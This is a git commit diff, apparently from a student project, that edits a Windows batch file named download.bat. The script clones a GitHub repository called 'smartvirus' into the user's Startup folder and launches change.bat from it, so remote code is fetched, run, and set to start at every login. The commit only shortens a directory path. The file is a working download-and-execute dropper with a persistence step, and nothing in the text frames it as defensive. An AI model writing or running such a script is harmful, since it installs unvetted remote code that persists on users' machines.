d78c6bb9aaf5fe3025357a1d160cb0d146289f4b
mattis_tjn <mattis.tajan@ecoles-epsi.net>
2024-01-24 16:24:40 +0100

    cd suppr

--- download.bat
+++ download.bat
@@ -1,5 +1,5 @@
 cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
 git clone https://github.com/mattistjnn/smartvirus
-cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/smartvirus
+cd smartvirus
 start change.bat
 exit
